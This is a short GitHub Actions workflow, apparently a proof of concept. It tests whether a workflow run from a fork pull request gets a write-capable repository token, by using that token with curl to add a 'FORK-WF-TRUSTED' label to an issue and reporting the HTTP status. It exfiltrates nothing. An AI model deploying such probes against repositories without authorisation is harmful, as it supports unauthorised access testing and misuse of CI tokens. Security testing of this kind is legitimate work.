name: poc-ci
on:
  pull_request:
  push:
permissions:
  pull-requests: write
  contents: read
jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo "FORK-WF-RAN actor=${{ github.actor }} event=${{ github.event_name }} ref=${{ github.ref }}"
          code=$(curl -s -o /dev/null -w '%{http_code}' -X POST -H "Authorization: token ${{ github.token }}" -H "Accept: application/vnd.github+json" https://api.github.com/repos/${{ github.repository }}/issues/41/labels -d '{"labels":["FORK-WF-TRUSTED"]}')
          echo "TOKEN_WRITE_HTTP=$code (201=fork workflow got WRITE token = CRITICAL)"
